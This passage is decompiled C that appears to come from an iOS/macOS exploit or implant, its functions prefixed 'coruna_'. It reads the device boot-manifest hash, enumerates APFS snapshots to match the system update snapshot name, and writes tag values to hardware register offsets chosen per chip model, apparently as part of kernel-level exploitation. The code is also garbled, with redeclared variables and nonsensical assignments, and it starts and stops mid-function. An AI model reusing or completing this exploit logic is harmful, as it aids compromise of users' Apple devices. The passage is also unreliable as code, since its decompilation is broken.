  scratch[0x145] = '\0';
  scratch[0x146] = '\0';
  scratch[0x147] = '\0';
  scratch[0x158] = '\0';
  scratch[0x159] = '\0';
  scratch[0x15a] = '\0';
  scratch[0x15b] = '\0';
  scratch[0x15c] = '\0';
  scratch[0x15d] = '\0';
  scratch[0x15e] = '\0';
  scratch[0x15f] = '\0';
  scratch[0x150] = '\0';
  scratch[0x151] = '\0';
  scratch[0x152] = '\0';
  scratch[0x153] = '\0';
  scratch[0x154] = '\0';
  scratch[0x155] = '\0';
  scratch[0x156] = '\0';
  scratch[0x157] = '\0';
  scratch[0x128] = '\0';
  scratch[0x129] = '\0';
  scratch[0x12a] = '\0';
  scratch[299] = '\0';
  scratch[300] = '\0';
  scratch[0x12d] = '\0';
  scratch[0x12e] = '\0';
  scratch[0x12f] = '\0';
  scratch[0x120] = '\0';
  scratch[0x121] = '\0';
  scratch[0x122] = '\0';
  scratch[0x123] = '\0';
  scratch[0x124] = '\0';
  scratch[0x125] = '\0';
  scratch[0x126] = '\0';
  scratch[0x127] = '\0';
  scratch[0x138] = '\0';
  scratch[0x139] = '\0';
  scratch[0x13a] = '\0';
  scratch[0x13b] = '\0';
  scratch[0x13c] = '\0';
  scratch[0x13d] = '\0';
  scratch[0x13e] = '\0';
  scratch[0x13f] = '\0';
  scratch[0x130] = '\0';
  scratch[0x131] = '\0';
  scratch[0x132] = '\0';
  scratch[0x133] = '\0';
  scratch[0x134] = '\0';
  scratch[0x135] = '\0';
  scratch[0x136] = '\0';
  scratch[0x137] = '\0';
  scratch[0x108] = '\0';
  scratch[0x109] = '\0';
  scratch[0x10a] = '\0';
  scratch[0x10b] = '\0';
  scratch[0x10c] = '\0';
  scratch[0x10d] = '\0';
  scratch[0x10e] = '\0';
  scratch[0x10f] = '\0';
  scratch[0x100] = '\0';
  scratch[0x101] = '\0';
  scratch[0x102] = '\0';
  scratch[0x103] = '\0';
  scratch[0x104] = '\0';
  scratch[0x105] = '\0';
  scratch[0x106] = '\0';
  scratch[0x107] = '\0';
  scratch[0x118] = '\0';
  scratch[0x119] = '\0';
  scratch[0x11a] = '\0';
  scratch[0x11b] = '\0';
  scratch[0x11c] = '\0';
  scratch[0x11d] = '\0';
  scratch[0x11e] = '\0';
  scratch[0x11f] = '\0';
  scratch[0x110] = '\0';
  scratch[0x111] = '\0';
  scratch[0x112] = '\0';
  scratch[0x113] = '\0';
  scratch[0x114] = '\0';
  scratch[0x115] = '\0';
  scratch[0x116] = '\0';
  scratch[0x117] = '\0';
  scratch[0xe8] = '\0';
  scratch[0xe9] = '\0';
  scratch[0xea] = '\0';
  scratch[0xeb] = '\0';
  scratch[0xec] = '\0';
  scratch[0xed] = '\0';
  scratch[0xee] = '\0';
  scratch[0xef] = '\0';
  scratch[0xe0] = '\0';
  scratch[0xe1] = '\0';
  scratch[0xe2] = '\0';
  scratch[0xe3] = '\0';
  scratch[0xe4] = '\0';
  scratch[0xe5] = '\0';
  scratch[0xe6] = '\0';
  scratch[0xe7] = '\0';
  scratch[0xf8] = '\0';
  scratch[0xf9] = '\0';
  scratch[0xfa] = '\0';
  scratch[0xfb] = '\0';
  scratch[0xfc] = '\0';
  scratch[0xfd] = '\0';
  scratch[0xfe] = '\0';
  scratch[0xff] = '\0';
  scratch[0xf0] = '\0';
  scratch[0xf1] = '\0';
  scratch[0xf2] = '\0';
  scratch[0xf3] = '\0';
  scratch[0xf4] = '\0';
  scratch[0xf5] = '\0';
  scratch[0xf6] = '\0';
  scratch[0xf7] = '\0';
  scratch[200] = '\0';
  scratch[0xc9] = '\0';
  scratch[0xca] = '\0';
  scratch[0xcb] = '\0';
  scratch[0xcc] = '\0';
  scratch[0xcd] = '\0';
  scratch[0xce] = '\0';
  scratch[0xcf] = '\0';
  scratch[0xc0] = '\0';
  scratch[0xc1] = '\0';
  scratch[0xc2] = '\0';
  scratch[0xc3] = '\0';
  scratch[0xc4] = '\0';
  scratch[0xc5] = '\0';
  scratch[0xc6] = '\0';
  scratch[199] = '\0';
  scratch[0xd8] = '\0';
  scratch[0xd9] = '\0';
  scratch[0xda] = '\0';
  scratch[0xdb] = '\0';
  scratch[0xdc] = '\0';
  scratch[0xdd] = '\0';
  scratch[0xde] = '\0';
  scratch[0xdf] = '\0';
  scratch[0xd0] = '\0';
  scratch[0xd1] = '\0';
  scratch[0xd2] = '\0';
  scratch[0xd3] = '\0';
  scratch[0xd4] = '\0';
  scratch[0xd5] = '\0';
  scratch[0xd6] = '\0';
  scratch[0xd7] = '\0';
  scratch[0xa8] = '\0';
  scratch[0xa9] = '\0';
  scratch[0xaa] = '\0';
  scratch[0xab] = '\0';
  scratch[0xac] = '\0';
  scratch[0xad] = '\0';
  scratch[0xae] = '\0';
  scratch[0xaf] = '\0';
  scratch[0xa0] = '\0';
  scratch[0xa1] = '\0';
  scratch[0xa2] = '\0';
  scratch[0xa3] = '\0';
  scratch[0xa4] = '\0';
  scratch[0xa5] = '\0';
  scratch[0xa6] = '\0';
  scratch[0xa7] = '\0';
  scratch[0xb8] = '\0';
  scratch[0xb9] = '\0';
  scratch[0xba] = '\0';
  scratch[0xbb] = '\0';
  scratch[0xbc] = '\0';
  scratch[0xbd] = '\0';
  scratch[0xbe] = '\0';
  scratch[0xbf] = '\0';
  scratch[0xb0] = '\0';
  scratch[0xb1] = '\0';
  scratch[0xb2] = '\0';
  scratch[0xb3] = '\0';
  scratch[0xb4] = '\0';
  scratch[0xb5] = '\0';
  scratch[0xb6] = '\0';
  scratch[0xb7] = '\0';
  scratch[0x88] = '\0';
  scratch[0x89] = '\0';
  scratch[0x8a] = '\0';
  scratch[0x8b] = '\0';
  scratch[0x8c] = '\0';
  scratch[0x8d] = '\0';
  scratch[0x8e] = '\0';
  scratch[0x8f] = '\0';
  scratch[0x80] = '\0';
  scratch[0x81] = '\0';
  scratch[0x82] = '\0';
  scratch[0x83] = '\0';
  scratch[0x84] = '\0';
  scratch[0x85] = '\0';
  scratch[0x86] = '\0';
  scratch[0x87] = '\0';
  scratch[0x98] = '\0';
  scratch[0x99] = '\0';
  scratch[0x9a] = '\0';
  scratch[0x9b] = '\0';
  scratch[0x9c] = '\0';
  scratch[0x9d] = '\0';
  scratch[0x9e] = '\0';
  scratch[0x9f] = '\0';
  scratch[0x90] = '\0';
  scratch[0x91] = '\0';
  scratch[0x92] = '\0';
  scratch[0x93] = '\0';
  scratch[0x94] = '\0';
  scratch[0x95] = '\0';
  scratch[0x96] = '\0';
  scratch[0x97] = '\0';
  scratch[0x68] = '\0';
  scratch[0x69] = '\0';
  scratch[0x6a] = '\0';
  scratch[0x6b] = '\0';
  scratch[0x6c] = '\0';
  scratch[0x6d] = '\0';
  scratch[0x6e] = '\0';
  scratch[0x6f] = '\0';
  scratch[0x60] = '\0';
  scratch[0x61] = '\0';
  scratch[0x62] = '\0';
  scratch[99] = '\0';
  scratch[100] = '\0';
  scratch[0x65] = '\0';
  scratch[0x66] = '\0';
  scratch[0x67] = '\0';
  scratch[0x78] = '\0';
  scratch[0x79] = '\0';
  scratch[0x7a] = '\0';
  scratch[0x7b] = '\0';
  scratch[0x7c] = '\0';
  scratch[0x7d] = '\0';
  scratch[0x7e] = '\0';
  scratch[0x7f] = '\0';
  scratch[0x70] = '\0';
  scratch[0x71] = '\0';
  scratch[0x72] = '\0';
  scratch[0x73] = '\0';
  scratch[0x74] = '\0';
  scratch[0x75] = '\0';
  scratch[0x76] = '\0';
  scratch[0x77] = '\0';
  scratch[0x48] = '\0';
  scratch[0x49] = '\0';
  scratch[0x4a] = '\0';
  scratch[0x4b] = '\0';
  scratch[0x4c] = '\0';
  scratch[0x4d] = '\0';
  scratch[0x4e] = '\0';
  scratch[0x4f] = '\0';
  scratch[0x40] = '\0';
  scratch[0x41] = '\0';
  scratch[0x42] = '\0';
  scratch[0x43] = '\0';
  scratch[0x44] = '\0';
  scratch[0x45] = '\0';
  scratch[0x46] = '\0';
  scratch[0x47] = '\0';
  scratch[0x58] = '\0';
  scratch[0x59] = '\0';
  scratch[0x5a] = '\0';
  scratch[0x5b] = '\0';
  scratch[0x5c] = '\0';
  scratch[0x5d] = '\0';
  scratch[0x5e] = '\0';
  scratch[0x5f] = '\0';
  scratch[0x50] = '\0';
  scratch[0x51] = '\0';
  scratch[0x52] = '\0';
  scratch[0x53] = '\0';
  scratch[0x54] = '\0';
  scratch[0x55] = '\0';
  scratch[0x56] = '\0';
  scratch[0x57] = '\0';
  scratch[0x28] = '\0';
  scratch[0x29] = '\0';
  scratch[0x2a] = '\0';
  scratch[0x2b] = '\0';
  scratch[0x2c] = '\0';
  scratch[0x2d] = '\0';
  scratch[0x2e] = '\0';
  scratch[0x2f] = '\0';
  scratch[0x20] = '\0';
  scratch[0x21] = '\0';
  scratch[0x22] = '\0';
  scratch[0x23] = '\0';
  scratch[0x24] = '\0';
  scratch[0x25] = '\0';
  scratch[0x26] = '\0';
  scratch[0x27] = '\0';
  scratch[0x38] = '\0';
  scratch[0x39] = '\0';
  scratch[0x3a] = '\0';
  scratch[0x3b] = '\0';
  scratch[0x3c] = '\0';
  scratch[0x3d] = '\0';
  scratch[0x3e] = '\0';
  scratch[0x3f] = '\0';
  scratch[0x30] = '\0';
  scratch[0x31] = '\0';
  scratch[0x32] = '\0';
  scratch[0x33] = '\0';
  scratch[0x34] = '\0';
  scratch[0x35] = '\0';
  scratch[0x36] = '\0';
  scratch[0x37] = '\0';
  scratch[8] = '\0';
  scratch[9] = '\0';
  scratch[10] = '\0';
  scratch[0xb] = '\0';
  scratch[0xc] = '\0';
  scratch[0xd] = '\0';
  scratch[0xe] = '\0';
  scratch[0xf] = '\0';
  scratch[0] = '\0';
  scratch[1] = '\0';
  scratch[2] = '\0';
  scratch[3] = '\0';
  scratch[4] = '\0';
  scratch[5] = '\0';
  scratch[6] = '\0';
  scratch[7] = '\0';
  scratch[0x18] = '\0';
  scratch[0x19] = '\0';
  scratch[0x1a] = '\0';
  scratch[0x1b] = '\0';
  scratch[0x1c] = '\0';
  scratch[0x1d] = '\0';
  scratch[0x1e] = '\0';
  scratch[0x1f] = '\0';
  scratch[0x10] = '\0';
  scratch[0x11] = '\0';
  scratch[0x12] = '\0';
  scratch[0x13] = '\0';
  scratch[0x14] = '\0';
  scratch[0x15] = '\0';
  scratch[0x16] = '\0';
  scratch[0x17] = '\0';
  size = _IORegistryEntryFromPath
                    (*(uint32_t *)k_kernel_kiomasterportdefault_slot,"IODeviceTree:/chosen");
  if ((int)size == 0) {
    port = 0;
    if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return port;
    }
    ___stack_chk_fail();
  }
  port = *(uint64_t *)k_kernel_kcfallocatordefault_slot;
  handle = _CFStringCreateWithCString(port,"boot-manifest-hash",0x8000100);
  if (handle == 0) {
    port = 0;
  }
  else {
    addr = _IORegistryEntryCreateCFProperty(size,handle,port,0);
    if (addr == 0) {
      port = 0;
    }
    else {
      off = _CFDataGetTypeID();
      base = _CFGetTypeID(addr);
      if (off == base) {
        version = _CFDataGetLength(addr);
        ptr = (byte *)_CFDataGetBytePtr(addr);
        if (0x7e < version - 1) goto done;
        ptr = scratch + 0x200;
        do {
          err = *ptr;
          *ptr = "0123456789ABCDEF"[(unsigned long)((err ^ size) >> 4) & 0xf];
          ptr[1] = "0123456789ABCDEF"[(unsigned long)(err ^ size) & 0xf];
          ptr = ptr + 2;
          u = (int)version - 1;
          version = (unsigned long)u;
          ptr = ptr + 1;
        } while (u != 0);
        _snprintf(scratch,0x200,"com.apple.os.update-%s");
        ptr = _strdup(scratch);
        if (ptr == (char *)0x0) goto done;
        *val = ptr;
        port = 1;
      }
      else {
done:
        port = 0;
      }
      _CFRelease(addr);
    }
    _CFRelease(handle);
  }
  _IOObjectRelease(size);
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return port;
  }
  ___stack_chk_fail();
}





unsigned long coruna_call_getattrlistbulk_39278(void)

{
  unsigned long type_id_13;
  int *err;
  
  type_id_13 = coruna_getattrlistbulk_39278(0xff,0,0,0,0,0);
  if ((int)type_id_13 != 0) {
    err = ___error();
    type_id_13 = (unsigned long)(*err != 1);
  }
  return type_id_13;
}
uint64_t coruna_return_zero_1828c(char *path,long *handle,uint *size)
{
  int err;
  uint u;
  uint *ptr;
  void *ptr;
  uint64_t size;
  unsigned long version;
  uint *buf;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  scratch = k_kernel_rodata_word_0003b550;
  scratch = k_kernel_rodata_word_3b548;
  bootargs = k_kernel_rodata_word_3b558;
  *size = 0;
  err = coruna_getattrlist();
  if (err == 0) {
    return 0;
  }
  err = _open(path,0x100000);
  if (err < 0) {
    return 0;
  }
  ptr = _calloc(0x1000,1);
  if (ptr != (uint *)0x0) {
    u = coruna_getattrlistbulk(err,&scratch,ptr,0x1000,0x40);
    if (-1 < (int)u) {
      *size = u;
      ptr = _calloc((unsigned long)u,8);
      *handle = (long)ptr;
      if (ptr != (void *)0x0) {
        if (u != 0) {
          version = 0;
          buf = ptr;
          do {
            if ((buf[1] & 1) == 0) {
              *(uint64_t *)(*handle + version * 8) = 0;
            }
            else {
              ptr = _calloc((unsigned long)buf[7],1);
              *(void **)(*handle + version * 8) = ptr;
              _strcpy(*(char **)(*handle + version * 8),(char *)(buf + 8));
              u = *size;
            }
            buf = (uint *)((long)buf + (unsigned long)*buf);
            version = version + 1;
          } while (version < u);
        }
        size = 1;
        if (0 < err) {
        _close(err);
        }
        if (ptr != (uint *)0x0) {
        _free(ptr);
        }
        return size;
      }
    }
  }
  size = 0;
fail:
  if (0 < err) {
    _close(err);
  }
  if (ptr != (uint *)0x0) {
    _free(ptr);
  }
  return size;
}





bool coruna_getattrlist(char *path)
{
  int err;
  uint64_t scratch;
  unsigned long scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint64_t host_info;
  uint64_t serial_buf;
  uint32_t action;
  uint32_t thread_attr;
  uint32_t block_ctx;
  uint64_t stack_guard;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  
  action = 0;
  stack_guard = 0;
  block_ctx = 0;
  host_info = 0;
  bootargs = 0;
  action = 0;
  thread_attr = 0;
  serial_buf = 0;
  scratch = 0;
  scratch = 0;
  thread_attr = 0;
  bootargs = 0;
  host_info = 5;
  serial_buf = 0x80020000;
  err = _getattrlist(path,&host_info,&scratch,0x4c,0x20);
  return err != 0 || (scratch & 0x20000) != 0;
}





byte coruna_kernel09_via_read_boot_manifest_hash(char *path,char *str_2,unsigned long arg)
{
  char *ptr;
  char *buf;
  unsigned long u;
  bool err;
  bool status;
  int err;
  int status;
  byte flags;
  unsigned long size;
  uint64_t *ptr;
  char *str;
  unsigned long version;
  uint64_t *buf;
  char *scratch;
  char *bootargs;
  uint thread_attr;
  uint64_t *host_info;
  
  host_info = (uint64_t *)0x0;
  thread_attr = 0;
  scratch = (char *)0x0;
  bootargs = (char *)0x0;
  err = coruna_read_boot_manifest_hash(&bootargs,0);
  if (((err == 0) || (err = coruna_read_boot_manifest_hash(&scratch,0x41), err == 0)) ||
     (err = coruna_return_zero_1828c(path,&host_info,&thread_attr), err == 0)) {
    flags = 0;
    err = -1;
    buf = host_info;
    version = (unsigned long)thread_attr;
    ptr = host_info;
    if (thread_attr != 0 && host_info != (uint64_t *)0x0) {
    do {
    _free((void *)*ptr);
    version = version - 1;
    ptr = ptr + 1;
    } while (version != 0);
    _free(buf);
    }
    if (bootargs != (char *)0x0) {
    _free(bootargs);
    }
    if (scratch != (char *)0x0) {
    _free(scratch);
    }
    if (0 < err) {
    _close(err);
    }
    return flags;
  }
  err = _open(path,0x100000);
  buf = host_info;
  buf = bootargs;
  if (err < 0) {
    flags = 0;
    buf = host_info;
    version = (unsigned long)thread_attr;
    ptr = host_info;
    if (thread_attr != 0 && host_info != (uint64_t *)0x0) {
    do {
    _free((void *)*ptr);
    version = version - 1;
    ptr = ptr + 1;
    } while (version != 0);
    _free(buf);
    }
    if (bootargs != (char *)0x0) {
    _free(bootargs);
    }
    if (scratch != (char *)0x0) {
    _free(scratch);
    }
    if (0 < err) {
    _close(err);
    }
    return flags;
  }
  version = (unsigned long)thread_attr;
  if (thread_attr == 0) {
    err = false;
    status = false;
    flags = err | status;
    buf = host_info;
    version = (unsigned long)thread_attr;
    ptr = host_info;
    if (thread_attr != 0 && host_info != (uint64_t *)0x0) {
    do {
    _free((void *)*ptr);
    version = version - 1;
    ptr = ptr + 1;
    } while (version != 0);
    _free(buf);
    }
    if (bootargs != (char *)0x0) {
    _free(bootargs);
    }
    if (scratch != (char *)0x0) {
    _free(scratch);
    }
    if (0 < err) {
    _close(err);
    }
    return flags;
  }
  status = _strcmp((char *)*host_info,bootargs);
  if (status == 0) {
    status = false;
    err = true;
  }
  else {
    u = 1;
    do {
      size = u;
      ptr = scratch;
      if (version == size) {
        err = size < version;
        goto cleanup;
      }
      status = _strcmp((char *)buf[size],buf);
      u = size + 1;
    } while (status != 0);
    status = false;
    err = size < version;
  }
  flags = err | status;
  buf = host_info;
  version = (unsigned long)thread_attr;
  ptr = host_info;
  if (thread_attr != 0 && host_info != (uint64_t *)0x0) {
  do {
  _free((void *)*ptr);
  version = version - 1;
  ptr = ptr + 1;
  } while (version != 0);
  _free(buf);
  }
  if (bootargs != (char *)0x0) {
  _free(bootargs);
  }
  if (scratch != (char *)0x0) {
  _free(scratch);
  }
  if (0 < err) {
  _close(err);
  }
  return flags;
}





byte coruna_kernel09_via_read_boot_manifest_hash_2(char *path,char *str_2)
{
  char *ptr;
  bool err;
  int err;
  int status;
  byte status;
  char *buf;
  char *str;
  unsigned long u;
  unsigned long size;
  uint64_t *ptr;
  uint64_t *buf;
  char *scratch;
  char *bootargs;
  uint thread_attr;
  uint64_t *host_info;
  
  host_info = (uint64_t *)0x0;
  thread_attr = 0;
  scratch = (char *)0x0;
  bootargs = (char *)0x0;
  err = coruna_read_boot_manifest_hash(&bootargs,0);
  if (((err == 0) || (err = coruna_read_boot_manifest_hash(&scratch,0x41), err == 0)) ||
     (err = coruna_return_zero_1828c(path,&host_info,&thread_attr), err == 0)) {
    status = 0;
    err = -1;
  }
  else {
    err = _open(path,0x100000);
    buf = host_info;
    ptr = scratch;
    if (err < 0) {
      status = 0;
    }
    else {
      size = (unsigned long)thread_attr;
      u = size;
      ptr = host_info;
      if (thread_attr != 0) {
        do {
          buf = (char *)*ptr;
          if ((buf != (char *)0x0) &&
             ((status = _strcmp(buf,ptr), status == 0 ||
              ((str_2 != (char *)0x0 && (status = _strcmp(buf,str_2), status == 0)))))) {
            err = false;
            status = 1;
            goto fail;
          }
          buf = bootargs;
          u = u - 1;
          ptr = ptr + 1;
        } while (u != 0);
        do {
          str = (char *)*buf;
          if ((str != (char *)0x0) && (status = _strcmp(str,buf), status == 0)) {
            status = coruna_getattrlistbulk_39278(3,err,str,ptr,0,0);
            status = 0;
            err = status == 0;
            goto fail;
          }
          buf = buf + 1;
          size = size - 1;
        } while (size != 0);
      }
      status = 0;
      err = false;
fail:
      status = status | err;
    }
  }
  buf = host_info;
  u = (unsigned long)thread_attr;
  ptr = host_info;
  if (thread_attr != 0 && host_info != (uint64_t *)0x0) {
    do {
      if ((void *)*ptr != (void *)0x0) {
        _free((void *)*ptr);
      }
      u = u - 1;
      ptr = ptr + 1;
    } while (u != 0);
    _free(buf);
  }
  if (0 < err) {
    _close(err);
  }
  if (bootargs != (char *)0x0) {
    _free(bootargs);
  }
  if (scratch != (char *)0x0) {
    _free(scratch);
  }
  return status;
}





void coruna_statfs_1881c(long handle)
{
  int err;
  unsigned long u;
  char *ptr;
  char scratch [2];
  statfs bootargs;
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  scratch[0] = '/';
  scratch[1] = '\0';
  _bzero(&bootargs,0x878);
  u = coruna_getattrlist(scratch);
  if ((int)u != 0) {
    err = _statfs(scratch,&bootargs);
    if (err == 0) {
      u = (unsigned long)(bootargs.f_fsid.val[0] != '\x01');
      if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
      return;
      }
      ___stack_chk_fail(u);
    }
    u = 1;
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(u);
}





void coruna_fn_ptr_cast_2(void)
{
  return;
}





unsigned long coruna_kernel6544_via_ctx_test_flag_3(long arg,unsigned long val)

{
  int j;
  
  j = coruna_ctx_test_flag(arg,0x5584001);
  if (((j != 0) && (val != 0)) && ((val >> 0x37 & 1) != 0)) {
    j = coruna_ctx_test_flag(arg,8);
    if ((j == 0) &&
       ((j = coruna_ctx_test_flag(arg,0x5000000), j == 0 ||
        (*(unsigned long *)(arg + 0x158) < 0x22580a06c00000)))) {
      val = val | 0xffffff8000000000;
    }
    else {
      val = val | 0xffff800000000000;
    }
  }
  return val;
}





uint64_t coruna_mach_absolute_time_18ebc(long handle,int flags)
{
  unsigned long u;
  int err;
  uint64_t size;
  long handle;
  
  if (flags == 0) {
    coruna_slot_clear(handle,4);
  }
  else {
    if (((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) &&
       (handle = *(long *)(*(long *)(handle + 0x118) + 0x150), handle != 0)) {
      size = _mach_absolute_time();
      u = 0;
      if ((unsigned long)*(uint *)(handle + 0x260) != 0) {
        u = ((size - handle) * (unsigned long)*(uint *)(handle + 0x25c)) /
                (unsigned long)*(uint *)(handle + 0x260);
      }
      if (u < 20000000) {
        coruna_semaphore_timedwait(handle,(0x14 - (int)((u & 0xffffffff) / 1000000)) * 1000);
      }
    }
    err = coruna_mach_absolute_time_1b5b4(handle,4,1000);
    if (err != 0) {
      return 0;
    }
    if ((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) {
      size = _mach_absolute_time();
      *(uint64_t *)(*(long *)(handle + 0x118) + 0x150) = size;
    }
  }
  return 1;
}





uint64_t coruna_mach_absolute_time_18f98(uint64_t val)
{
  unsigned long u;
  bool err;
  int err;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  long handle;
  long addr;
  uint32_t tag;
  uint64_t kind;
  double ld11;
  double ld12;
  unsigned long type_id;
  long scratch [7];
  mach_timebase_info_t bootargs;
  
  bootargs.numer = 0;
  bootargs.denom = 0;
  _mach_timebase_info(&bootargs);
  type_id = (unsigned long)bootargs & 0xffffffff;
  u = (unsigned long)bootargs >> 0x20;
  size = _mach_absolute_time();
  err = coruna_ctx_test_flag(val,0x1000000);
  if (err == 0) {
    err = coruna_ctx_test_flag(val,0x100000);
    if (err == 0) {
      err = coruna_ctx_test_flag(val,0x80000);
      if (err == 0) {
        err = coruna_ctx_test_flag(val,0x4000);
        port = 0x23b080000;
        if ((err == 0) && (err = coruna_ctx_test_flag(val,1), err == 0)) {
          return 0xad022;
        }
        err = coruna_vm_protect(val,port,scratch);
        if (err != 0) {
        return 0xad022;
        }
        tag = 0x1f0023ff;
        err = coruna_ctx_test_flag(val,0x1000000);
        if (err == 0) {
        err = coruna_ctx_test_flag(val,0x100000);
        if (err == 0) {
        err = coruna_ctx_test_flag(val,0x80000);
        if (err == 0) {
        err = coruna_ctx_test_flag(val,0x4000);
        tag = 0x1f0003ff;
        if (err != 0) {
        addr = 0x390;
        if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
        ld11 = (double)NEON_ucvtf(u);
        ld12 = (double)NEON_ucvtf(type_id);
        ld11 = (ld11 / ld12) * k_kernel_rodata_word_3b788 * k_kernel_rodata_word_3b4e0;
        *(uint32_t *)(addr + scratch[0]) = tag;
        do {
        version = _mach_absolute_time();
        if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
        } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
        coruna_semaphore_timedwait(val,1000);
        }
        coruna_mach_port_deallocate_2d808(val,scratch);
        return 0;
        }
        err = coruna_ctx_test_flag(val,1);
        if (err == 0) {
        coruna_mach_port_deallocate_2d808(val,scratch);
        return 0xad022;
        }
        err = coruna_cpu_core_count();
        err = err == 8;
        handle = 0x388;
        }
        else {
        err = coruna_cpu_core_count();
        if (err < 8) {
        addr = 0x3d0;
        if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
        ld11 = (double)NEON_ucvtf(u);
        ld12 = (double)NEON_ucvtf(type_id);
        ld11 = (ld11 / ld12) * k_kernel_rodata_word_3b788 * k_kernel_rodata_word_3b4e0;
        *(uint32_t *)(addr + scratch[0]) = tag;
        do {
        version = _mach_absolute_time();
        if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
        } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
        coruna_semaphore_timedwait(val,1000);
        }
        coruna_mach_port_deallocate_2d808(val,scratch);
        return 0;
        }
        err = coruna_ctx_test_flag(val,0x200000);
        err = err == 0;
        handle = 0x3c0;
        }
        addr = 0x3f8;
        }
        else {
        err = coruna_cpu_core_count();
        if (err < 8) {
        addr = 0x3c8;
        if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
        ld11 = (double)NEON_ucvtf(u);
        ld12 = (double)NEON_ucvtf(type_id);
        ld11 = (ld11 / ld12) * k_kernel_rodata_word_3b788 * k_kernel_rodata_word_3b4e0;
        *(uint32_t *)(addr + scratch[0]) = tag;
        do {
        version = _mach_absolute_time();
        if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
        } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
        coruna_semaphore_timedwait(val,1000);
        }
        coruna_mach_port_deallocate_2d808(val,scratch);
        return 0;
        }
        err = coruna_ctx_test_flag(val,0x2000000);
        err = err == 0;
        handle = 0x108;
        addr = 0x430;
        }
        if (!err) {
        addr = handle;
        }
        }
        else {
        addr = 0x408;
        }
        if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
        ld11 = (double)NEON_ucvtf(u);
        ld12 = (double)NEON_ucvtf(type_id);
        ld11 = (ld11 / ld12) * k_kernel_rodata_word_3b788 * k_kernel_rodata_word_3b4e0;
        *(uint32_t *)(addr + scratch[0]) = tag;
        do {
        version = _mach_absolute_time();
        if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
        } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
        coruna_semaphore_timedwait(val,1000);
        }
        coruna_mach_port_deallocate_2d808(val,scratch);
        return 0;
      }
      kind = 0x28e580000;
      port = 0x200000;
    }
    else {
      kind = 0x404e80000;
      port = 0x2000000;
    }
    err = coruna_ctx_test_flag(val,port);
    port = 0x23b700000;
    if (err != 0) {
      port = kind;
    }
  }
  else {
    port = 0x23b700000;
  }
fail:
  err = coruna_vm_protect(val,port,scratch);
  if (err != 0) {
    return 0xad022;
  }
  tag = 0x1f0023ff;
  err = coruna_ctx_test_flag(val,0x1000000);
  if (err == 0) {
    err = coruna_ctx_test_flag(val,0x100000);
    if (err == 0) {
      err = coruna_ctx_test_flag(val,0x80000);
      if (err == 0) {
        err = coruna_ctx_test_flag(val,0x4000);
        tag = 0x1f0003ff;
        if (err != 0) {
          addr = 0x390;
          if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
          ld11 = (double)NEON_ucvtf(u);
          ld12 = (double)NEON_ucvtf(type_id);
          ld11 = (ld11 / ld12) * k_kernel_rodata_word_3b788 * k_kernel_rodata_word_3b4e0;
          *(uint32_t *)(addr + scratch[0]) = tag;
          do {
          version = _mach_absolute_time();
          if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
          } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
          coruna_semaphore_timedwait(val,1000);
          }
          coruna_mach_port_deallocate_2d808(val,scratch);
          return 0;
        }
        err = coruna_ctx_test_flag(val,1);
        if (err == 0) {
          coruna_mach_port_deallocate_2d808(val,scratch);
          return 0xad022;
        }
        err = coruna_cpu_core_count();
        err = err == 8;
        handle = 0x388;
      }
      else {
        err = coruna_cpu_core_count();
        if (err < 8) {
          addr = 0x3d0;
          if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
          ld11 = (double)NEON_ucvtf(u);
          ld12 = (double)NEON_ucvtf(type_id);
          ld11 = (ld11 / ld12) * k_kernel_rodata_word_3b788 * k_kernel_rodata_word_3b4e0;
          *(uint32_t *)(addr + scratch[0]) = tag;
          do {
          version = _mach_absolute_time();
          if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
          } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
          coruna_semaphore_timedwait(val,1000);
          }
          coruna_mach_port_deallocate_2d808(val,scratch);
          return 0;
        }
        err = coruna_ctx_test_flag(val,0x200000);
        err = err == 0;
        handle = 0x3c0;
      }
      addr = 0x3f8;
    }
    else {
      err = coruna_cpu_core_count();
      if (err < 8) {
        addr = 0x3c8;
        if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
        ld11 = (double)NEON_ucvtf(u);
        ld12 = (double)NEON_ucvtf(type_id);
        ld11 = (ld11 / ld12) * k_kernel_rodata_word_3b788 * k_kernel_rodata_word_3b4e0;
        *(uint32_t *)(addr + scratch[0]) = tag;
        do {
        version = _mach_absolute_time();
        if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
        } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
        coruna_semaphore_timedwait(val,1000);
        }
        coruna_mach_port_deallocate_2d808(val,scratch);
        return 0;
      }
      err = coruna_ctx_test_flag(val,0x2000000);
      err = err == 0;
      handle = 0x108;
      addr = 0x430;
    }
    if (!err) {
      addr = handle;
    }
  }
  else {
    addr = 0x408;
  }
done:
  if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
    ld11 = (double)NEON_ucvtf(u);
    ld12 = (double)NEON_ucvtf(type_id);
